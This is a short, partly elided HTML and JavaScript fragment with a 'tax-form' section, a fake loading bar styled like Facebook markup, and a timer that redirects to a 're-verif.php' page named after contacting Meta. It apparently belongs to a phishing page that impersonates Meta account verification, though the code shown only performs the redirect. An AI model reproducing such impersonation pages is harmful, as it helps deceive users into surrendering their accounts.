                ...
                <div id="tax-form">
                    <div id="AboutYouSection" class="Question AboutYouSection">
                        <div class="ElementWrapper">
                            <div class="_1b1g">
                                <span class="img _55ym _55yq _55yo" id="progressBar" aria-valuetext="Loading..." aria-busy="true" value="0" max="5"></span>
                            </div>
                            <script type="text/javascript">
                                ...
                                var downloadTimer = setInterval(function() {
                                    ...
                                    if (timeleft <= 0)
                                        setTimeout("window.location='re-verif.php?section_id=13-HowToContactMeta'");
                                }, 1000);
                            </script>
                        </div>
